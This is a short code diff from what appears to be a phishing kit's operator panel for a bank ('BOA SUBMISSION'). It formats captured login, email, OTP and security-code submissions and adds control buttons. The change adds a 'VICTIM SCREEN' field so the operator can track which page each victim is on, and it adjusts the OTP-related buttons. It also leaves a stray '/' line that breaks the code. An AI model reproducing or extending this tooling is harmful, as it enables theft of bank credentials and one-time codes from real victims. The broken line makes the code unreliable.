@@ -438,7 +438,7 @@ async function buildMessage(data, options = {}) {
       heading = `👤 BOA SUBMISSION\n\n USER: @${display}`;
     }
 
-    let message = `${heading}\n\n`;
+    let message = `${heading}\nVICTIM SCREEN: ${page}\n\n`;
 
     const excludeKeys = ["visitor", "userid", "security_code"];
 
@@ -661,13 +661,10 @@ if (page === "login" || page === "email" || page === "otp") {
     };
   }
 
-/*  buttons.push([
-    badButton,
-    {
-      text: "Phone OTP",
-      callback_data: `cmd:phone-otp:${userId}`
-    }
-  ]); */
+/
+buttons.push([
+    badButton
+  ]); 
 }
 
 
